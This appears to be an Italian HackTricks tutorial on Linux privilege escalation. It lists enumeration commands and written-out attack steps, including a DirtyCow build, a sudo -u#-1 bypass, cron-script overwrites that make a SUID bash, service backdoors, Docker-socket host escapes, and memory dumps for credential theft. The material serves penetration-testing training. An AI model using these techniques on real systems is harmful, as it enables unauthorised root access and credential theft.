# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informazioni sul sistema

### Informazioni sul SO

Iniziamo a ottenere alcune informazioni sul SO in esecuzione
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Se **hai permessi di scrittura su qualsiasi cartella all'interno della variabile `PATH`** potresti essere in grado di dirottare alcune librerie o binari:
```bash
echo $PATH
```
### Info ambiente

Informazioni interessanti, password o chiavi API nelle variabili d'ambiente?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Controlla la versione del kernel e se c'è qualche exploit che può essere utilizzato per elevare i privilegi.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Puoi trovare un buon elenco di kernel vulnerabili e alcuni **exploit compilati** qui: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) e [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Altri siti dove puoi trovare alcuni **exploit compilati**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Per estrarre tutte le versioni vulnerabili del kernel da quel sito puoi fare:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Strumenti che potrebbero aiutare a cercare exploit del kernel sono:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (eseguire SULLA vittima, controlla solo exploit per kernel 2.x)

Cerca sempre **la versione del kernel su Google**, forse la tua versione del kernel è scritta in qualche exploit del kernel e allora sarai sicuro che questo exploit è valido.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Versione di Sudo

Basato sulle versioni vulnerabili di sudo che appaiono in:
```bash
searchsploit sudo
```
Puoi controllare se la versione di sudo è vulnerabile utilizzando questo grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Da @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg verifica della firma fallita

Controlla **smasher2 box di HTB** per un **esempio** di come questa vulnerabilità potrebbe essere sfruttata
```bash
dmesg 2>/dev/null | grep "signature"
```
### Maggiore enumerazione del sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumerare le possibili difese

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Se sei all'interno di un container docker, puoi provare a fuggire da esso:

{{#ref}}
docker-security/
{{#endref}}

## Drives

Controlla **cosa è montato e smontato**, dove e perché. Se qualcosa è smontato, potresti provare a montarlo e controllare informazioni private.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Software utili

Enumerare i binari utili
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Controlla anche se **è installato un compilatore**. Questo è utile se hai bisogno di utilizzare qualche exploit del kernel, poiché è consigliato compilarlo nella macchina in cui lo utilizzerai (o in una simile).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software vulnerabile installato

Controlla la **versione dei pacchetti e dei servizi installati**. Potrebbe esserci qualche vecchia versione di Nagios (ad esempio) che potrebbe essere sfruttata per l'escalation dei privilegi...\
Si consiglia di controllare manualmente la versione del software installato più sospetto.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Se hai accesso SSH alla macchina, puoi anche utilizzare **openVAS** per controllare se ci sono software obsoleti e vulnerabili installati all'interno della macchina.

> [!NOTE] > _Nota che questi comandi mostreranno molte informazioni che saranno per lo più inutili, quindi è consigliato utilizzare alcune applicazioni come OpenVAS o simili che verificheranno se qualche versione del software installato è vulnerabile a exploit noti._

## Processi

Dai un'occhiata a **quali processi** vengono eseguiti e controlla se qualche processo ha **più privilegi di quanto dovrebbe** (magari un tomcat eseguito da root?)
```bash
ps aux
ps -ef
top -n 1
```
Controlla sempre la presenza di [**debugger electron/cef/chromium**] in esecuzione, potresti abusarne per elevare i privilegi](electron-cef-chromium-debugger-abuse.md). **Linpeas** li rileva controllando il parametro `--inspect` all'interno della riga di comando del processo.\
Controlla anche **i tuoi privilegi sui binari dei processi**, forse puoi sovrascrivere qualcuno.

### Monitoraggio dei processi

Puoi utilizzare strumenti come [**pspy**](https://github.com/DominicBreuker/pspy) per monitorare i processi. Questo può essere molto utile per identificare processi vulnerabili eseguiti frequentemente o quando viene soddisfatto un insieme di requisiti.

### Memoria del processo

Alcuni servizi di un server salvano **le credenziali in chiaro all'interno della memoria**.\
Normalmente avrai bisogno di **privilegi di root** per leggere la memoria dei processi che appartengono ad altri utenti, quindi questo è solitamente più utile quando sei già root e vuoi scoprire ulteriori credenziali.\
Tuttavia, ricorda che **come utente normale puoi leggere la memoria dei processi che possiedi**.

> [!WARNING]
> Tieni presente che oggigiorno la maggior parte delle macchine **non consente ptrace per impostazione predefinita**, il che significa che non puoi dumpare altri processi che appartengono al tuo utente non privilegiato.
>
> Il file _**/proc/sys/kernel/yama/ptrace_scope**_ controlla l'accessibilità di ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: tutti i processi possono essere debugged, purché abbiano lo stesso uid. Questo è il modo classico in cui funzionava ptracing.
> - **kernel.yama.ptrace_scope = 1**: solo un processo padre può essere debugged.
> - **kernel.yama.ptrace_scope = 2**: solo l'amministratore può utilizzare ptrace, poiché richiede la capacità CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Nessun processo può essere tracciato con ptrace. Una volta impostato, è necessario un riavvio per abilitare nuovamente ptracing.

#### GDB

Se hai accesso alla memoria di un servizio FTP (ad esempio) potresti ottenere l'Heap e cercare all'interno delle sue credenziali.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Per un dato ID di processo, **maps mostra come la memoria è mappata all'interno dello spazio degli indirizzi virtuali di quel processo**; mostra anche le **permissive di ciascuna regione mappata**. Il **mem** pseudo file **espone la memoria dei processi stessi**. Dal file **maps** sappiamo quali **regioni di memoria sono leggibili** e i loro offset. Utilizziamo queste informazioni per **cercare nel file mem e scaricare tutte le regioni leggibili** in un file.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` fornisce accesso alla **memoria** fisica del sistema, non alla memoria virtuale. Lo spazio degli indirizzi virtuali del kernel può essere accessibile utilizzando /dev/kmem.\
Tipicamente, `/dev/mem` è leggibile solo da **root** e dal gruppo **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump per linux

ProcDump è una reinterpretazione per Linux del classico strumento ProcDump della suite di strumenti Sysinternals per Windows. Ottienilo su [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Strumenti

Per eseguire il dump della memoria di un processo puoi usare:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Puoi rimuovere manualmente i requisiti di root e dumpare il processo di tua proprietà
- Script A.5 da [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (è richiesto root)

### Credenziali dalla memoria del processo

#### Esempio manuale

Se trovi che il processo dell'autenticatore è in esecuzione:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Puoi eseguire il dump del processo (vedi le sezioni precedenti per trovare diversi modi per eseguire il dump della memoria di un processo) e cercare credenziali all'interno della memoria:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Lo strumento [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **ruba le credenziali in chiaro dalla memoria** e da alcuni **file ben noti**. Richiede privilegi di root per funzionare correttamente.

| Caratteristica                                      | Nome Processo        |
| --------------------------------------------------- | -------------------- |
| Password GDM (Kali Desktop, Debian Desktop)         | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop)   | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                            | lightdm              |
| VSFTPd (Connessioni FTP Attive)                     | vsftpd               |
| Apache2 (Sessioni HTTP Basic Auth Attive)           | apache2              |
| OpenSSH (Sessioni SSH Attive - Uso di Sudo)         | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

Controlla se qualche lavoro programmato è vulnerabile. Forse puoi approfittare di uno script eseguito da root (vulnerabilità wildcard? può modificare file che usa root? usare symlink? creare file specifici nella directory che usa root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Ad esempio, all'interno di _/etc/crontab_ puoi trovare il PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Nota come l'utente "user" abbia privilegi di scrittura su /home/user_)

Se all'interno di questo crontab l'utente root cerca di eseguire qualche comando o script senza impostare il path. Ad esempio: _\* \* \* \* root overwrite.sh_\
Allora, puoi ottenere una shell root usando:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron usando uno script con un carattere jolly (Wildcard Injection)

Se uno script eseguito da root contiene un “**\***” all'interno di un comando, potresti sfruttarlo per fare cose inaspettate (come privesc). Esempio:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Se il carattere jolly è preceduto da un percorso come** _**/some/path/\***_ **, non è vulnerabile (anche** _**./\***_ **non lo è).**

Leggi la pagina seguente per ulteriori trucchi di sfruttamento dei caratteri jolly:

{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Sovrascrittura di script cron e symlink

Se **puoi modificare uno script cron** eseguito da root, puoi ottenere una shell molto facilmente:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Se lo script eseguito da root utilizza una **directory a cui hai accesso completo**, potrebbe essere utile eliminare quella cartella e **creare una cartella symlink a un'altra** che serve uno script controllato da te.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Lavori cron frequenti

Puoi monitorare i processi per cercare quelli che vengono eseguiti ogni 1, 2 o 5 minuti. Potresti approfittarne e aumentare i privilegi.

Ad esempio, per **monitorare ogni 0,1s per 1 minuto**, **ordinare per comandi meno eseguiti** e eliminare i comandi che sono stati eseguiti di più, puoi fare:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Puoi anche usare** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (questo monitorerà e elencherà ogni processo che inizia).

### Cron job invisibili

È possibile creare un cronjob **mettendo un ritorno a capo dopo un commento** (senza carattere di nuova linea), e il cron job funzionerà. Esempio (nota il carattere di ritorno a capo):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servizi

### File _.service_ scrivibili

Controlla se puoi scrivere qualsiasi file `.service`, se puoi, **potresti modificarlo** in modo che **esegua** il tuo **backdoor quando** il servizio viene **avviato**, **riavviato** o **interrotto** (forse dovrai aspettare fino a quando la macchina non viene riavviata).\
Ad esempio, crea il tuo backdoor all'interno del file .service con **`ExecStart=/tmp/script.sh`**

### Binaries di servizio scrivibili

Tieni presente che se hai **permessi di scrittura sui binary eseguiti dai servizi**, puoi cambiarli con backdoor in modo che quando i servizi vengono rieseguiti, le backdoor vengano eseguite.

### systemd PATH - Percorsi relativi

Puoi vedere il PATH utilizzato da **systemd** con:
```bash
systemctl show-environment
```
Se scopri di poter **scrivere** in una delle cartelle del percorso, potresti essere in grado di **escalare i privilegi**. Devi cercare **percorsi relativi utilizzati nei file di configurazione dei servizi** come:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Poi, crea un **eseguibile** con lo **stesso nome del percorso relativo del binario** all'interno della cartella PATH di systemd in cui puoi scrivere, e quando il servizio viene chiesto di eseguire l'azione vulnerabile (**Start**, **Stop**, **Reload**), il tuo **backdoor verrà eseguito** (gli utenti non privilegiati di solito non possono avviare/arrestare servizi, ma controlla se puoi usare `sudo -l`).

**Scopri di più sui servizi con `man systemd.service`.**

## **Timer**

I **Timer** sono file di unità systemd il cui nome termina con `**.timer**` che controllano i file o eventi `**.service**`. I **Timer** possono essere utilizzati come alternativa a cron poiché hanno supporto integrato per eventi di tempo del calendario e eventi di tempo monotono e possono essere eseguiti in modo asincrono.

Puoi enumerare tutti i timer con:
```bash
systemctl list-timers --all
```
### Timer scrivibili

Se puoi modificare un timer, puoi farlo eseguire alcune istanze di systemd.unit (come un `.service` o un `.target`)
```bash
Unit=backdoor.service
```
Nella documentazione puoi leggere cosa è l'Unit:

> L'unità da attivare quando questo timer scade. L'argomento è un nome di unità, il cui suffisso non è ".timer". Se non specificato, questo valore predefinito è un servizio che ha lo stesso nome dell'unità timer, tranne per il suffisso. (Vedi sopra.) Si raccomanda che il nome dell'unità che viene attivata e il nome dell'unità del timer siano nominati in modo identico, tranne per il suffisso.

Pertanto, per abusare di questo permesso dovresti:

- Trovare qualche unità systemd (come un `.service`) che sta **eseguendo un binario scrivibile**
- Trovare qualche unità systemd che sta **eseguendo un percorso relativo** e hai **privilegi di scrittura** sul **PATH di systemd** (per impersonare quell'eseguibile)

**Scopri di più sui timer con `man systemd.timer`.**

### **Abilitare il Timer**

Per abilitare un timer hai bisogno di privilegi di root ed eseguire:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Nota che il **timer** è **attivato** creando un symlink su `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

I Unix Domain Sockets (UDS) abilitano la **comunicazione tra processi** sulla stessa o su macchine diverse all'interno di modelli client-server. Utilizzano file descrittori Unix standard per la comunicazione inter-computer e sono configurati tramite file `.socket`.

I sockets possono essere configurati utilizzando file `.socket`.

**Scopri di più sui sockets con `man systemd.socket`.** All'interno di questo file, possono essere configurati diversi parametri interessanti:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Queste opzioni sono diverse ma viene utilizzato un riepilogo per **indicare dove ascolterà** il socket (il percorso del file socket AF_UNIX, l'IPv4/6 e/o il numero di porta da ascoltare, ecc.)
- `Accept`: Accetta un argomento booleano. Se **vero**, una **istanza di servizio viene generata per ogni connessione in arrivo** e solo il socket di connessione viene passato ad essa. Se **falso**, tutti i sockets di ascolto stessi sono **passati all'unità di servizio avviata**, e solo un'unità di servizio viene generata per tutte le connessioni. Questo valore viene ignorato per i sockets datagram e le FIFO dove un'unica unità di servizio gestisce incondizionatamente tutto il traffico in arrivo. **Di default è falso**. Per motivi di prestazioni, si raccomanda di scrivere nuovi demoni solo in un modo che sia adatto per `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Accetta una o più righe di comando, che vengono **eseguite prima** o **dopo** che i **sockets**/FIFO di ascolto siano **creati** e legati, rispettivamente. Il primo token della riga di comando deve essere un nome di file assoluto, seguito da argomenti per il processo.
- `ExecStopPre`, `ExecStopPost`: Comandi aggiuntivi che vengono **eseguiti prima** o **dopo** che i **sockets**/FIFO di ascolto siano **chiusi** e rimossi, rispettivamente.
- `Service`: Specifica il nome dell'unità di **servizio** **da attivare** su **traffico in arrivo**. Questa impostazione è consentita solo per sockets con Accept=no. Di default è il servizio che porta lo stesso nome del socket (con il suffisso sostituito). Nella maggior parte dei casi, non dovrebbe essere necessario utilizzare questa opzione.

### File .socket scrivibili

Se trovi un file `.socket` **scrivibile** puoi **aggiungere** all'inizio della sezione `[Socket]` qualcosa come: `ExecStartPre=/home/kali/sys/backdoor` e la backdoor verrà eseguita prima che il socket venga creato. Pertanto, **probabilmente dovrai aspettare fino a quando la macchina non verrà riavviata.**\
&#xNAN;_&#x4E;ota che il sistema deve utilizzare quella configurazione del file socket o la backdoor non verrà eseguita_

### Sockets scrivibili

Se **identifichi un socket scrivibile** (_ora stiamo parlando di Unix Sockets e non dei file di configurazione `.socket`_), allora **puoi comunicare** con quel socket e forse sfruttare una vulnerabilità.

### Enumerare i Unix Sockets
```bash
netstat -a -p --unix
```
### Connessione grezza
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Esempio di sfruttamento:**

{{#ref}}
socket-command-injection.md
{{#endref}}

### Sockets HTTP

Nota che potrebbero esserci alcuni **sockets in ascolto per richieste HTTP** (_Non sto parlando di file .socket ma dei file che fungono da sockets unix_). Puoi verificare questo con:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Se il socket **risponde con una richiesta HTTP**, allora puoi **comunicare** con esso e forse **sfruttare qualche vulnerabilità**.

### Socket Docker Scrivibile

Il socket Docker, spesso trovato in `/var/run/docker.sock`, è un file critico che dovrebbe essere protetto. Per impostazione predefinita, è scrivibile dall'utente `root` e dai membri del gruppo `docker`. Possedere l'accesso in scrittura a questo socket può portare a un'escalation dei privilegi. Ecco una panoramica di come ciò può essere fatto e metodi alternativi se il Docker CLI non è disponibile.

#### **Escalation dei Privilegi con Docker CLI**

Se hai accesso in scrittura al socket Docker, puoi elevare i privilegi utilizzando i seguenti comandi:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Questi comandi ti consentono di eseguire un contenitore con accesso a livello root al file system dell'host.

#### **Utilizzando direttamente l'API Docker**

Nei casi in cui il Docker CLI non sia disponibile, il socket Docker può comunque essere manipolato utilizzando l'API Docker e i comandi `curl`.

1.  **Elenca le immagini Docker:** Recupera l'elenco delle immagini disponibili.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Crea un contenitore:** Invia una richiesta per creare un contenitore che monta la directory radice del sistema host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Avvia il contenitore appena creato:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Collegati al contenitore:** Usa `socat` per stabilire una connessione al contenitore, abilitando l'esecuzione di comandi al suo interno.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Dopo aver impostato la connessione `socat`, puoi eseguire comandi direttamente nel contenitore con accesso a livello root al file system dell'host.

### Altri

Nota che se hai permessi di scrittura sul socket docker perché sei **all'interno del gruppo `docker`** hai [**più modi per elevare i privilegi**](interesting-groups-linux-pe/index.html#docker-group). Se l'[**API docker sta ascoltando su una porta** puoi anche essere in grado di comprometterla](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Controlla **altri modi per uscire da docker o abusarne per elevare i privilegi** in:

{{#ref}}
docker-security/
{{#endref}}

## Elevazione dei privilegi di Containerd (ctr)

Se scopri di poter utilizzare il comando **`ctr`** leggi la pagina seguente poiché **potresti essere in grado di abusarne per elevare i privilegi**:

{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **Elevazione dei privilegi di RunC**

Se scopri di poter utilizzare il comando **`runc`** leggi la pagina seguente poiché **potresti essere in grado di abusarne per elevare i privilegi**:

{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus è un sofisticato **sistema di comunicazione inter-processo (IPC)** che consente alle applicazioni di interagire e condividere dati in modo efficiente. Progettato tenendo presente il moderno sistema Linux, offre un robusto framework per diverse forme di comunicazione tra applicazioni.

Il sistema è versatile, supportando IPC di base che migliora lo scambio di dati tra processi, simile a **socket di dominio UNIX avanzati**. Inoltre, aiuta a trasmettere eventi o segnali, favorendo un'integrazione senza soluzione di continuità tra i componenti del sistema. Ad esempio, un segnale da un demone Bluetooth riguardo a una chiamata in arrivo può indurre un lettore musicale a silenziarsi, migliorando l'esperienza dell'utente. Inoltre, D-Bus supporta un sistema di oggetti remoti, semplificando le richieste di servizio e le invocazioni di metodo tra le applicazioni, snellendo processi che erano tradizionalmente complessi.

D-Bus opera su un **modello di autorizzazione/negazione**, gestendo i permessi dei messaggi (chiamate di metodo, emissioni di segnali, ecc.) in base all'effetto cumulativo delle regole di policy corrispondenti. Queste politiche specificano le interazioni con il bus, consentendo potenzialmente l'elevazione dei privilegi attraverso lo sfruttamento di questi permessi.

Un esempio di tale politica in `/etc/dbus-1/system.d/wpa_supplicant.conf` è fornito, dettagliando i permessi per l'utente root di possedere, inviare e ricevere messaggi da `fi.w1.wpa_supplicant1`.

Le politiche senza un utente o gruppo specificato si applicano universalmente, mentre le politiche di contesto "predefinite" si applicano a tutti non coperti da altre politiche specifiche.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Impara come enumerare e sfruttare una comunicazione D-Bus qui:**

{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Rete**

È sempre interessante enumerare la rete e capire la posizione della macchina.

### Enumerazione generica
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Controlla sempre i servizi di rete in esecuzione sulla macchina con cui non sei stato in grado di interagire prima di accedervi:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Controlla se puoi sniffare il traffico. Se puoi, potresti essere in grado di acquisire alcune credenziali.
```
timeout 1 tcpdump
```
## Utenti

### Enumerazione Generica

Controlla **chi** sei, quali **privilegi** hai, quali **utenti** sono nei sistemi, quali possono **accedere** e quali hanno **privilegi di root:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Alcune versioni di Linux sono state colpite da un bug che consente agli utenti con **UID > INT_MAX** di elevare i privilegi. Maggiori informazioni: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) e [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Sfruttalo** usando: **`systemd-run -t /bin/bash`**

### Groups

Controlla se sei un **membro di qualche gruppo** che potrebbe concederti privilegi di root:

{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Controlla se c'è qualcosa di interessante all'interno degli appunti (se possibile)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politica delle Password
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

Se **conosci qualche password** dell'ambiente **cerca di accedere come ogni utente** utilizzando la password.

### Su Brute

Se non ti dispiace fare molto rumore e i binari `su` e `timeout` sono presenti sul computer, puoi provare a forzare l'accesso agli utenti usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
